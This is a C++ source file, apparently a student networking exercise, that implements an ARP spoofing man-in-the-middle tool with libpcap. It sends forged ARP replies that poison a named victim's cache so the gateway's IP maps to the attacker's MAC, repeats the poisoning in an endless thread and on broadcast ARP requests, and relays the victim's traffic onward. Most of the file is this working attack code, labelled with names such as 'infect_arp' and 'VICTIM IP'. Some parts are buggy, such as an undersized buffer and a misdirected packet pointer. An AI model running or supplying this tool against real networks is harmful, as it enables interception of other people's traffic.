#include <cstdio>
#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <net/if_arp.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <netinet/if_ether.h>
#include <pthread.h>
#include <time.h>

//#define ETHER_ADDR_LEN 6

struct libnet_ethernet_hdr
{
    u_int8_t  ether_dhost[ETHER_ADDR_LEN];/* destination ethernet address */
    u_int8_t  ether_shost[ETHER_ADDR_LEN];/* source ethernet address */
    u_int16_t ether_type;                 /* protocol */
};

struct libnet_ipv4_hdr
{
	    u_int8_t ip_hl:4; 
	    u_int8_t ip_v:4;       /* version */
		          /* header length */

	    u_int8_t ip_tos;       /* type of service */
	#ifndef IPTOS_LOWDELAY
	#define IPTOS_LOWDELAY      0x10
	#endif
	#ifndef IPTOS_THROUGHPUT
	#define IPTOS_THROUGHPUT    0x08
	#endif
	#ifndef IPTOS_RELIABILITY
	#define IPTOS_RELIABILITY   0x04
	#endif
	#ifndef IPTOS_LOWCOST
	#define IPTOS_LOWCOST       0x02
	#endif
	    u_int16_t ip_len;         /* total length */
	    u_int16_t ip_id;          /* identification */
	    u_int16_t ip_off;
	#ifndef IP_RF
	#define IP_RF 0x8000        /* reserved fragment flag */
	#endif
	#ifndef IP_DF
	#define IP_DF 0x4000        /* dont fragment flag */
	#endif
	#ifndef IP_MF
	#define IP_MF 0x2000        /* more fragments flag */
	#endif 
	#ifndef IP_OFFMASK
	#define IP_OFFMASK 0x1fff   /* mask for fragmenting bits */
	#endif
	    u_int8_t ip_ttl;          /* time to live */
	    u_int8_t ip_p;            /* protocol */
	    u_int16_t ip_sum;         /* checksum */
	    struct in_addr ip_src, ip_dst; /* source and dest address */
};

struct libnet_tcp_hdr
{
	    u_int16_t th_sport;       /* source port */
	    u_int16_t th_dport;       /* destination port */
	    u_int32_t th_seq;          /* sequence number */
	    u_int32_t th_ack;          /* acknowledgement number */
	    u_int8_t th_off;      /* data offset */
	    u_int8_t th_flags;       /* control flags */
	#ifndef TH_FIN
	#define TH_FIN    0x01      /* finished send data */
	#endif
	#ifndef TH_SYN
	#define TH_SYN    0x02      /* synchronize sequence numbers */
	#endif
	#ifndef TH_RST
	#define TH_RST    0x04      /* reset the connection */
	#endif
	#ifndef TH_PUSH
	#define TH_PUSH   0x08      /* push data to the app layer */
	#endif
	#ifndef TH_ACK
	#define TH_ACK    0x10      /* acknowledge */
	#endif
	#ifndef TH_URG
	#define TH_URG    0x20      /* urgent! */
	#endif
	#ifndef TH_ECE
	#define TH_ECE    0x40
	#endif
	#ifndef TH_CWR   
	#define TH_CWR    0x80
	#endif
	    u_int16_t th_win;         /* window */
	    u_int16_t th_sum;         /* checksum */
	    u_int16_t th_urp;         /* urgent pointer */
};

void print_mac(u_int8_t *mac){
	printf("MAC  %02x:%02x:%02x:%02x:%02x:%02x  ->  ",mac[6],mac[7],mac[8],mac[9],mac[10],mac[11]);
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void print_ip(u_int8_t *ip){
	printf("IP   %u:%u:%u:%u           ->  ",ip[0],ip[1],ip[2],ip[3]);
	printf("%u:%u:%u:%u\n\n",ip[4],ip[5],ip[6],ip[7]);
}

void print_port(u_int8_t *port){
	uint16_t port_number1 = ntohs(*(uint16_t*)(port));   // port[0] + port[1]  -> u_int16_t
	uint16_t port_number2 = ntohs(*(uint16_t*)(port+2));   // port[2] + port[3]  -> u_int16_t
	printf("PORT %d              ->",port_number1);
	printf("  %d\n\n",port_number2);
}

void print_data(u_int8_t *data){
	printf("DATA  %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n\n",data[0],data[1],data[2],data[3],data[4],data[5],data[6],data[7],data[8],data[9]);
}

void usage() {
	printf("syntax: pcap-test <handsomeface>\n");
	printf("sample: pcap-test wlan0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
struct ThreadArgs {
    const char *arg1;
    const char *arg2;
    const char *arg3;
    const char *arg4;
    const char *arg5;
};

int find_mac_address(char* ip_str, char* mac_str) {
    struct arpreq areq;
    struct sockaddr_in* sin;
    struct sockaddr sa;
    struct in_addr ipaddr;
    int sd;

    memset(&areq, 0, sizeof(areq));
    memset(&sa, 0, sizeof(struct sockaddr));

    sin = (struct sockaddr_in*) &sa;
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, ip_str, &ipaddr);
    sin->sin_addr = ipaddr;

    memcpy(&areq.arp_pa, &sa, sizeof(struct sockaddr));
    
    strcpy(areq.arp_dev, "eth0");
    sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sd < 0) {
        perror("socket");
        return -1;
    }

    if (ioctl(sd, SIOCGARP, &areq) < 0) {
        perror("ioctl");
        close(sd);
        return -1;
    }
    
    close(sd);

    unsigned char* mac_addr = (unsigned char*) areq.arp_ha.sa_data;
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);

    return 0;
}

void *infect_arp(void *args)
{
	while(1){
	struct ThreadArgs *threadArgs = (struct ThreadArgs *)args;
	const char *sender = threadArgs->arg1;
	const char *target = threadArgs->arg2;
	const char *mac_str1 = threadArgs->arg3;
	const char *my_mac_add = threadArgs->arg4;
	const char *mac_str2 = threadArgs->arg5;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* infect_handle = pcap_open_live("eth0", 0, 0, 0, errbuf);
	EthArpPacket infect_packet;
	
	infect_packet.eth_.dmac_ = Mac(mac_str1);
	infect_packet.eth_.smac_ = Mac(my_mac_add);
	infect_packet.eth_.type_ = htons(EthHdr::Arp);
	infect_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	infect_packet.arp_.pro_ = htons(EthHdr::Ip4);
	infect_packet.arp_.hln_ = Mac::SIZE;
	infect_packet.arp_.pln_ = Ip::SIZE;
	infect_packet.arp_.op_ = htons(ArpHdr::Reply);  //if attack change request to reply
	infect_packet.arp_.smac_ = Mac(mac_str2);
	infect_packet.arp_.sip_ = htonl(Ip(target));
	infect_packet.arp_.tmac_ = Mac(mac_str1);
	infect_packet.arp_.tip_ = htonl(Ip(sender));

	int res = pcap_sendpacket(infect_handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(infect_handle));
	}
		printf("thread");
		pcap_close(infect_handle);
	}
}

int main(int argc, char* argv[]) {

	struct Mac gateway;
	struct Mac sender_mac;
	char* dev = argv[1];
	char mac_str[6];
	char errbuf[PCAP_ERRBUF_SIZE];
	pthread_t p_thread;
	int thr_id;
	struct ThreadArgs threadArgs;
    	
    	
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);		//dont send packet? dont recive packet
	char my_mac_add[18];
	FILE *fp = popen("ifconfig eth0 | awk '/ether/ {print $2}'", "r");

	if (fp != NULL) {
	if (fgets(my_mac_add, sizeof(my_mac_add), fp)) {
			printf("MY MAC 주소: %s\n", my_mac_add);
		}
		pclose(fp);
	} else {
	printf("명령 실행 에러\n");
	}
	EthArpPacket packet;

	char mac_str1[18];
	if (find_mac_address(argv[2], mac_str1) == 0) {
	printf("VICTIM IP: %s -> MAC: %s\n", argv[2], mac_str1);
	}else{
	printf("Failed to find MAC address of %s\n", argv[2]);
	}
		

	char mac_str2[18];
	char gateway_mac[18];

	if (find_mac_address(argv[3], mac_str2) == 0) {
	printf("GATEWAY IP: %s -> MAC: %s\n", argv[3], mac_str2);
	}else{
	printf("Failed to find MAC address of %s\n", argv[3]);
	}

	gateway=Mac(mac_str2);
	sender_mac=Mac(mac_str1);
	
	packet.eth_.dmac_ = Mac(mac_str1);
	packet.eth_.smac_ = Mac(my_mac_add);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);  //if attack change request to reply
	packet.arp_.smac_ = Mac(mac_str2);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(mac_str1);
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	pcap_close(handle);
	
	
	threadArgs.arg1 = argv[2];
    	threadArgs.arg2 = argv[3];
    	threadArgs.arg3 = mac_str1;
    	threadArgs.arg4 = my_mac_add;
    	threadArgs.arg5 = mac_str2;
    	thr_id = pthread_create(&p_thread, NULL, infect_arp, (void *)&threadArgs);
	//pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);		//dont send packet? dont recive packet
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		//printf("%u bytes captured\n\n", header->caplen);
		struct libnet_ethernet_hdr *ethernet_hdr = (struct libnet_ethernet_hdr *)packet;
		int packet_len=14;
		if (ntohs(ethernet_hdr->ether_type) == ETHERTYPE_ARP)		//if arp and broadcast -> send arp
		{
			printf("\nim arp    ");
			snprintf(mac_str, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
	         		ethernet_hdr->ether_dhost[0], ethernet_hdr->ether_dhost[1], ethernet_hdr->ether_dhost[2], ethernet_hdr->ether_dhost[3], 		 ethernet_hdr->ether_dhost[4], ethernet_hdr->ether_dhost[5]);
			printf("mac: %s",mac_str);
			if (strcmp(mac_str,"ff:ff:ff:ff:ff:ff")==0)
			{
				printf("  broadcast\n");
				pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);		//dont send packet? dont recive packet
				char my_mac_add[18];
				FILE *fp = popen("ifconfig eth0 | awk '/ether/ {print $2}'", "r");

				if (fp != NULL) {
					if (fgets(my_mac_add, sizeof(my_mac_add), fp)) {
							printf("MY MAC 주소: %s\n", my_mac_add);
						}
					pclose(fp);
				} 
				else {
					printf("명령 실행 에러\n");
				}
				EthArpPacket packet;

				char mac_str1[18];
				if (find_mac_address(argv[2], mac_str1) == 0) {
					printf("VICTIM IP: %s -> MAC: %s\n", argv[2], mac_str1);
				}else{
					printf("Failed to find MAC address of %s\n", argv[2]);
				}
					

				char mac_str2[18];
				if (find_mac_address(argv[3], mac_str2) == 0) {
					printf("GATEWAY IP: %s -> MAC: %s\n", argv[3], mac_str2);
				}else{
					printf("Failed to find MAC address of %s\n", argv[3]);
				}
					
				packet.eth_.dmac_ = Mac(mac_str1);
				packet.eth_.smac_ = Mac(my_mac_add);
				packet.eth_.type_ = htons(EthHdr::Arp);
				packet.arp_.hrd_ = htons(ArpHdr::ETHER);
				packet.arp_.pro_ = htons(EthHdr::Ip4);
				packet.arp_.hln_ = Mac::SIZE;
				packet.arp_.pln_ = Ip::SIZE;
				packet.arp_.op_ = htons(ArpHdr::Reply);  //if attack change request to reply
				packet.arp_.smac_ = Mac(mac_str2);
				packet.arp_.sip_ =  htonl(Ip(argv[3]));
				packet.arp_.tmac_ = Mac(mac_str1);
				packet.arp_.tip_ = htonl(Ip(argv[2]));

				int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
				}
				
			}
		}	
		else{		// if not arp -> relay packet
			printf(" %u bytes captured \n", header->caplen);
			struct EthHdr *eth_hdr2 =(struct EthHdr *)packet;
			struct libnet_ethernet_hdr *ethernet_hdr = (struct libnet_ethernet_hdr *)packet;
			struct libnet_ipv4_hdr *ipv4_hdr = (struct libnet_ipv4_hdr *)(packet+sizeof(struct libnet_ethernet_hdr));
			struct libnet_tcp_hdr *tcp_hdr = (struct libnet_tcp_hdr *)(packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_ipv4_hdr));
			
			if (Mac(ethernet_hdr->ether_shost)==sender_mac){
				if (ntohs(ethernet_hdr->ether_type) != ETHERTYPE_ARP ){
					printf("sender mac: %s\n -> \n",mac_str1);
					eth_hdr2->dmac_ = gateway;
					Mac(ethernet_hdr->ether_dhost) = eth_hdr2->dmac_;
					printf("gateway:  %s\n", static_cast<std::string>(gateway).c_str());
					// printf("MAC:  %s   ->   %s\n",
					// 			static_cast<std::string>(Mac(ethernet_hdr->ether_shost)).c_str(),
					// 			static_cast<std::string>(Mac(ethernet_hdr->ether_dhost)).c_str()
					// 			);
					res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), header->caplen);
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
					}
				}
			}
	
		}
	
	}  // while flow
	pthread_join(p_thread, NULL);
	pcap_close(pcap);	
}
